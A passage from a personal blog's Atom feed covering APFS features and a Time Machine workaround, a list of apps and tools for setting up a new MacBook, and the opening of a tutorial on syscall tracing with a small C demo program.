&lt;p&gt;Disk utility has two buttons that can be used to add and remove volumes from an &lt;abbr&gt;APFS&lt;/abbr&gt; container. Each volume is like a separate file system, so you can have multiple volumes, some with different encryption keys and some with no encryption.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-adding-volume.png&quot; alt=&quot;Adding a volume to an APFS-formatter container&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is even possible to specify some constraints, like reserving a minimum amount of space for a given volume or limiting its maximum size.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-volume-size-options.png&quot; alt=&quot;APFS volume size options&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a really awesome feature, and I think all file systems should allow this. There are some solutions that allow this, like &lt;abbr title=&quot;Logical Volume Manager&quot;&gt;LVM&lt;/abbr&gt; or some file system that natively support it, like &lt;abbr&gt;ZFS&lt;/abbr&gt;. The only possible downside is that if the file system was corrupted, it could affect all volumes on it, instead of just one as with partitioning. But that scenario is very hypothetical, and it won’t keep me from using this awesome new feature.&lt;/p&gt;

&lt;h3 id=&quot;clones&quot;&gt;Clones&lt;/h3&gt;

&lt;p&gt;Apple has a nice overview of some of the new features, including the clone mechanism.&lt;sup id=&quot;fnref:apfs-overview&quot;&gt;&lt;a href=&quot;#fn:apfs-overview&quot; class=&quot;footnote&quot;&gt;8&lt;/a&gt;&lt;/sup&gt; Testing the clone facility is quite easy, if you simply copy something in finder, you will see the result: it is possible to copy a large file, say a 2&lt;abbr&gt;GB&lt;/abbr&gt; movie, an obscene amount of times almost instantly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-clone-movie.png&quot; alt=&quot;APFS clone illustrated on some movies&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This feature is not without criticism. It does not work when you use &lt;code class=&quot;highlighter-rouge&quot;&gt;cp&lt;/code&gt; in the terminal, for example, because you need to use Apple &lt;abbr&gt;API&lt;/abbr&gt;s to access it. Also, it might not be overly useful since most programs will completely rewrite files when modifying them&lt;sup id=&quot;fnref:apfs-in-etail&quot;&gt;&lt;a href=&quot;#fn:apfs-in-etail&quot; class=&quot;footnote&quot;&gt;9&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;

&lt;h3 id=&quot;snapshots&quot;&gt;Snapshots&lt;/h3&gt;

&lt;p&gt;This is the one feature that I haven’t been able to play around with too much yet, unfortunately. I’ve seen that it is actively used on my system, and I can list which snapshots exist using the &lt;code class=&quot;highlighter-rouge&quot;&gt;tmutil&lt;/code&gt; tool.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ tmutil listlocalsnapshots /
com.apple.TimeMachine.2018-09-15-141751
com.apple.TimeMachine.2018-09-17-214432
com.apple.TimeMachine.2018-09-17-224235
com.apple.TimeMachine.2018-09-17-234536
com.apple.TimeMachine.2018-09-18-004444
com.apple.TimeMachine.2018-09-18-192237
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From what I understand, snapshots are used before installing apps or updates to create a “known-good” point to get back to in case things get hairy. Apparently, it is also possible to mount them. But I will save this for another article on another day!&lt;/p&gt;

&lt;h2 id=&quot;issues&quot;&gt;Issues&lt;/h2&gt;

&lt;p&gt;The interesting thing with file systems is that they are good when you don’t notice them. They are there to store your data, and you should never have to directly interact with them. As long as they keep your data, all is good. As soon as they throw error messages at you, or corrupt your data, you know that something in going wrong.&lt;/p&gt;

&lt;p&gt;I haven’t encountered any issues with &lt;abbr&gt;APFS&lt;/abbr&gt;, and I don’t think I will. It seems like a stable product, and since it is used by default on all new macOS installations and on iPhones as well, I’m sure it receives a huge amount of testing to make sure it runs well.&lt;/p&gt;

&lt;p&gt;The only issue is that any applications that rely on specific filesystem features need to be adjusted. And that is the only area where I’ve run into an issue.&lt;/p&gt;

&lt;h3 id=&quot;time-machine&quot;&gt;Time Machine&lt;/h3&gt;

&lt;p&gt;Currently, Time Machine only supports storing its backups on &lt;abbr&gt;HFS+&lt;/abbr&gt;-formatted volumes. When you have an &lt;abbr&gt;APFS&lt;/abbr&gt;-formatted drive mounted and you try to switch to it, it will not show up in the Time Machine preference pane.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-time-machine-preferences.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I am very sure that this issue will be fixed very quickly, as I presume that Apple wants to switch all &lt;abbr&gt;HFS+&lt;/abbr&gt; volumes over to &lt;abbr&gt;APFS&lt;/abbr&gt; soon, since they probably don’t want to support both file systems indefinitely.&lt;/p&gt;

&lt;p&gt;But in the meantime, there is a workaround that is not pretty but it works for me. I basically created a disk image by pressing &lt;kbd&gt;&amp;#8984;&lt;/kbd&gt;N in Disk Utility (File → New Image → Blank Image). I selected the &lt;em&gt;sparse bundle disk image&lt;/em&gt;, which is an image that only takes up as much space as it actually uses, gave it a descriptive name, set the size to 500&lt;abbr title=&quot;Gigabytes&quot;&gt;GB&lt;/abbr&gt; which should be plenty for my backups, and selected &lt;em&gt;Mac OS Extended (Journaled)&lt;/em&gt; as the file system instead of the default &lt;abbr&gt;APFS&lt;/abbr&gt;. This is important.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/apfs-time-machine-disk-image.png&quot; alt=&quot;APFS Time Machine disk image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, you need to make sure that the disk image is mounted. All you need to do to convince Time Machine to use it as backup disk is use the command-line tool &lt;code class=&quot;highlighter-rouge&quot;&gt;tmutil&lt;/code&gt;. If you named your volume something else than “Time Machine”, you’ll have to change that in the command obviously.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo tmutil setdestination &quot;/Volumes/Time Machine&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, I think that &lt;abbr&gt;APFS&lt;/abbr&gt; is a very neat and stable system. I think it has some nice features, but it doesn’t go overboard resulting in a theoretically cool, but practically unstable file system.&lt;/p&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:1&quot;&gt;
      &lt;p&gt;It’s a little more complicated than that, I know. &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:2&quot;&gt;
      &lt;p&gt;Unless your operating system uses a microkernel. But that’s very unlikely. &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:3&quot;&gt;
      &lt;p&gt;VirtualBox, for example, uses a kernel module that manages to crash my macOS occasionally. &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:4&quot;&gt;
      &lt;p&gt;Unless they are &lt;a href=&quot;https://en.wikipedia.org/wiki/Hans_Reiser&quot;&gt;currently in jail&lt;/a&gt;, I suppose. &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:hfs-floppy&quot;&gt;
      &lt;p&gt;Actually, it would have also been designed with floppy disks in mind. Do you still remember those? Crazy how fast storage technology moves. &lt;a href=&quot;#fnref:hfs-floppy&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:apple-apfs&quot;&gt;
      &lt;p&gt;See &lt;a href=&quot;https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/APFS_Guide/FAQ/FAQ.html&quot;&gt;Apple &lt;abbr&gt;APFS&lt;/abbr&gt; &lt;abbr&gt;FAQ&lt;/abbr&gt;&lt;/a&gt; &lt;a href=&quot;#fnref:apple-apfs&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:imore-apfs&quot;&gt;
      &lt;p&gt;See &lt;a href=&quot;https://www.imore.com/apfs&quot;&gt;https://www.imore.com/apfs&lt;/a&gt; &lt;a href=&quot;#fnref:imore-apfs&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:apfs-overview&quot;&gt;
      &lt;p&gt;See &lt;a href=&quot;https://developer.apple.com/documentation/foundation/file_system/about_apple_file_system#overview&quot;&gt;Apple &lt;abbr&gt;APFS&lt;/abbr&gt; overview&lt;/a&gt; &lt;a href=&quot;#fnref:apfs-overview&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:apfs-in-etail&quot;&gt;
      &lt;p&gt;See Adam Leventhal’s excellent article &lt;a href=&quot;http://dtrace.org/blogs/ahl/2016/06/19/apfs-part1/&quot;&gt;&lt;abbr&gt;APFS&lt;/abbr&gt; in Detail&lt;/a&gt; &lt;a href=&quot;#fnref:apfs-in-etail&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name></name></author><summary type="html">File systems are fascinating and scary. When I heard that Apple was working on its own in 2016, I was immediately interested. Now, in 2018, APFS is standard on both macOS and iOS.</summary></entry><entry><title type="html">Fresh system</title><link href="https://blog.xfbs.net/posts/setting-up-fresh-system" rel="alternate" type="text/html" title="Fresh system" /><published>2018-09-09T00:00:00+02:00</published><updated>2018-09-09T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/setting-up-fresh-system</id><content type="html" xml:base="https://blog.xfbs.net/posts/setting-up-fresh-system">&lt;p&gt;I just bought a new MacBook since I managed to break my old one while travelling in Taiwan. I always love getting a new system, because the setting up phase is a good opportunity to get rid of old cruft and review what is essential for me.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/macos-fresh-screenshot.png&quot; alt=&quot;Clean and fresh macOS desktop&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;apps&quot;&gt;Apps&lt;/h2&gt;

&lt;p&gt;What I like about macOS is that it comes with a lot of great tools out-of-the-box. However, I still ended up having to install a few essentials to get me started.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://brew.sh/&quot;&gt;Homebrew&lt;/a&gt;, the de-facto standard package manager for macOS. Necessary to install apps, mostly command-line related, and keep them up-to-date.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/xcode/&quot;&gt;Xcode&lt;/a&gt; for iOS and macOS app development. Xcode is actually surprisingly nice, but I don’t use it outside of app development.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://kapeli.com/dash&quot;&gt;Dash&lt;/a&gt;, an offline documentation viewer. Great interface lets you find things faster and allows you to work offline.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://mozilla.org/firefox&quot;&gt;Firefox&lt;/a&gt; because it is always good to have another browser besides Safari, however some people prefer &lt;a href=&quot;https://www.google.com/chrome/&quot;&gt;Chrome&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tug.org/mactex/&quot;&gt;MacTeX&lt;/a&gt;, a LaTeX distribution for macOS. Necessary if you are a student and have to write papers that look decent.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt; to run &lt;abbr title=&quot;Virtual Machine&quot;&gt;VM&lt;/abbr&gt;s, mostly for development. Some people prefer &lt;a href=&quot;https://www.vmware.com&quot;&gt;VMware&lt;/a&gt;, which I have never tried.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.codeux.com/textual/&quot;&gt;Textual&lt;/a&gt;, awesome &lt;abbr title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/abbr&gt; client.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.texpad.com&quot;&gt;Texpad&lt;/a&gt;, a LaTeX editor with some nifty features.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.sublimetext.com/&quot;&gt;Sublime Text&lt;/a&gt;, awesome programmer’s text editor.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Additionally, I also installed a couple of apps that are not strictly necessary, but I still use them occasionally.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gitup.co/&quot;&gt;Git Up&lt;/a&gt;, a &lt;abbr title=&quot;Guided User Interface&quot;&gt;GUI&lt;/abbr&gt; for interacting with git repositories.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.videolan.org/&quot;&gt;&lt;abbr title=&quot;VideoLAN Client&quot;&gt;VLC&lt;/abbr&gt;&lt;/a&gt;, the famous media player that can play &lt;em&gt;anything&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://transmissionbt.com&quot;&gt;Transmission&lt;/a&gt;, awesome gorrent client.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://openemu.org&quot;&gt;OpenEmu&lt;/a&gt;, for playing those old Mario games.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Instead of using the awesome &lt;a href=&quot;https://www.shimovpn.com/&quot;&gt;shimo&lt;/a&gt; app, I opted for using the native &lt;abbr title=&quot;Internet Key Exchange&quot;&gt;IKE&lt;/abbr&gt;v2 support in macOS to set up some of my &lt;abbr title=&quot;Virtual Private Network&quot;&gt;VPN&lt;/abbr&gt;s. It is always useful to have a few in case you are forced to use a questionable public WiFi. I probably will need to set up Shimo anyways to access my university’s &lt;abbr&gt;VPN&lt;/abbr&gt; at some point in time.&lt;/p&gt;

&lt;h2 id=&quot;packages&quot;&gt;Packages&lt;/h2&gt;

&lt;p&gt;With homebrew installed, I went on to installing some essential command-line tools, and updating others that Apple ships but are too old.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://git-scm.com&quot;&gt;Git&lt;/a&gt; version control system. I keep a lot of things under its control, such as this blog.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.vim.org&quot;&gt;&lt;abbr title=&quot;VI Improved&quot;&gt;VIM&lt;/abbr&gt;&lt;/a&gt;, the ubiquitous editor. My go-to editor for a lot of things. Ships out-of-the-box on macOS (thank you Apple!), but with an outdated version. Some people prefer the newer &lt;a href=&quot;https://neovim.io&quot;&gt;NeoVim&lt;/a&gt;, others like &lt;a href=&quot;https://www.gnu.org/software/emacs/&quot;&gt;Emacs&lt;/a&gt; and some people don’t like any command-line text-editors.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/tmux/tmux/wiki&quot;&gt;tmux&lt;/a&gt;, for having multiple tabs in a single Terminal session.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ruby-lang.org&quot;&gt;Ruby&lt;/a&gt;, my favourite programming language. Also ships out-of-the-box on macOS, but with an outdated version.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rust-lang.org/&quot;&gt;Rust&lt;/a&gt;, Mozilla’s fancy-pants new language.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;dash&quot;&gt;Dash&lt;/h2&gt;

&lt;p&gt;Out of all these great tools, there is one app that I want to highlight because it has radically improved my productivity.
 when I bought it in 2015. While I have been using it for so long, I still feel that not too many people know about it.&lt;/p&gt;

&lt;p&gt;Dash is an offline documentation browser. That means that it has a catalog of documentation for various programming languages, frameworks, gems, pods, tools, etc. These are called &lt;em&gt;docsets&lt;/em&gt;. Most docsets are official and autogenerated or maintained by the author, but there are also plenty of user-contributed ones. The format is open, such that you can create your own docsets. There are also a bunch of Dash clones for other platforms that use them, such as &lt;a href=&quot;https://zealdocs.org&quot;&gt;Zeal&lt;/a&gt; on Linux or &lt;a href=&quot;https://velocity.silverlakesoftware.com&quot;&gt;Velocity&lt;/a&gt; on Microsoft Windows.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dash-app-screenshot.png&quot; alt=&quot;Dash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I love Dash because the interface is well-designed. For example if you want to find out something about the Ruby &lt;code class=&quot;highlighter-rouge&quot;&gt;Array#join&lt;/code&gt; method, you try &lt;code class=&quot;highlighter-rouge&quot;&gt;ruby: Array join&lt;/code&gt; into the search field. I find that using Dash is far more effective that googling for things, and you can explore classes and find out what methods they have. The docsets are really good and auto-update, which is important for languages like Rust that have new releases often.&lt;/p&gt;

&lt;p&gt;Another interesting feature is that Dash can download all &lt;a href=&quot;https://stackoverflow.com&quot;&gt;StackOverflow&lt;/a&gt; answers that are tagged to a specific programming language or framework. This can sometimes be useful if you can’t figure out from the documentation how things fit together, but I don’t use that feature much.&lt;/p&gt;

&lt;p&gt;It does cost some money, I paid around &lt;span title=&quot;about $33&quot; class=&quot;underlined&quot;&gt;28€&lt;/span&gt; for my license. But I think it is definitely worth it. Also, I think it is really awesome that my license, which I bought in 2015 for dash 3, was updated to work with dash 4 when it was released in 2017. Thanks Kapeli!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I am only as good as the tools I have at my disposal. And there are some really nice ones for macOS. Here I have shown what I consider to be my most useful ones—they might not be right for you. But maybe you didn’t know about some of these before, and they are useful to you. In that case, if you can afford it, I’m sure the author would appreciate if you bought it.&lt;/p&gt;</content><author><name>xfbs</name></author><summary type="html">I just bought a new MacBook since I managed to break my old one while travelling in Taiwan. I always love getting a new system, because the setting up phase is a good opportunity to get rid of old cruft and review what is essential for me.</summary></entry><entry><title type="html">Tracing in Linux and macOS</title><link href="https://blog.xfbs.net/posts/tracing-linux-macos" rel="alternate" type="text/html" title="Tracing in Linux and macOS" /><published>2018-02-22T00:00:00+01:00</published><updated>2018-02-22T00:00:00+01:00</updated><id>https://blog.xfbs.net/posts/tracing-linux-macos</id><content type="html" xml:base="https://blog.xfbs.net/posts/tracing-linux-macos">&lt;p&gt;If you’re coming from Linux, you may be familiar with the &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace&lt;/code&gt; family of commands — &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt;. If you’re coming from macOS, you may have had brief encounters with &lt;code class=&quot;highlighter-rouge&quot;&gt;dtruss&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt;, instead.&lt;/p&gt;

&lt;p&gt;If you haven’t heard of them before or haven’t had the chance to play with them, this post is for you. I’m going to show you what they do and why they are important tools to know.&lt;/p&gt;

&lt;h2 id=&quot;tracing-syscalls&quot;&gt;Tracing syscalls&lt;/h2&gt;

&lt;p&gt;Let’s say you have an application, a small program, and you want to know analyze what it does. In this example, I’ll use a small program that checks if a file is present — if it’s not present, it will fail with a warning. I am using the &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; function, which is a &lt;abbr title=&quot;Portable Operating System Interface&quot;&gt;POSIX&lt;/abbr&gt; &lt;abbr title=&quot;Application Programming Interface&quot;&gt;API&lt;/abbr&gt;, to check if a file exists.&lt;/p&gt;

&lt;h6 id=&quot;file-safec-lines-031&quot;&gt;File safe.c, lines 0–31:&lt;/h6&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include 
#include 
#include 
#include 
#include
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// security by obscurity&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.secret_file_seed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error: secret file is missing.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;congratulations!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For convenience, here’s a minimal &lt;code class=&quot;highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; to build this program.&lt;/p&gt;

&lt;h6 id=&quot;file-makefile-lines-02&quot;&gt;File Makefile, lines 0–2:&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# build all binaries (default target).
all: safe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;on-linux&quot;&gt;On Linux&lt;/h3&gt;

&lt;p&gt;I’m using a fresh Ubuntu &lt;abbr title=&quot;Virtual Machine&quot;&gt;VM&lt;/abbr&gt; to perform these tests. You’ll need some packages to compile this example — &lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt;, a compiler (&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;clang&lt;/code&gt; will do just fine), and optionally &lt;code class=&quot;highlighter-rouge&quot;&gt;musl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;musl-gcc&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt update
$ apt install -y build-essential musl musl-dev musl-tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

